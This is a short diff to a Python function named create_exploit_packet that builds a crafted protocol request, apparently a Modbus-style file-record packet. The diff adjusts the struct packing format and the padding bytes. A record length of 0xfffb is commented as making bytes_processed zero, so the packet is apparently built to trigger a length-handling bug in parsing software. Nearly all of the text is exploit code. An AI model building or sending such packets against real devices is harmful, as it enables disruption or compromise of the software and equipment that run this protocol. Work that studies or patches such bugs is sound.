@@ -17,7 +17,7 @@ def create_exploit_packet():
     record_length_2 = 0xfffb  # Cause bytes_processed to become 0
     
     # Append first group
-    payload += struct.pack('>BHHH',
+    payload = struct.pack('>HHHH',
                            reference_type_1,
                            file_number_1,
                            record_number_1,
@@ -27,7 +27,7 @@ def create_exploit_packet():
     # Append second group
     payload += struct.pack('>H',
                            record_length_2)
-    payload += b'\x7F\x00\x00\x00\x00\x00\x00\x00'  # Minimum 1 bytes of data for the second group
+    payload += b'\x7F' +  b'\x00'*19 # Minimum 1 bytes of data for the second group
 
     # Calculate request_data_length
     request_data_length = 0x20  # Subtract function_code byte
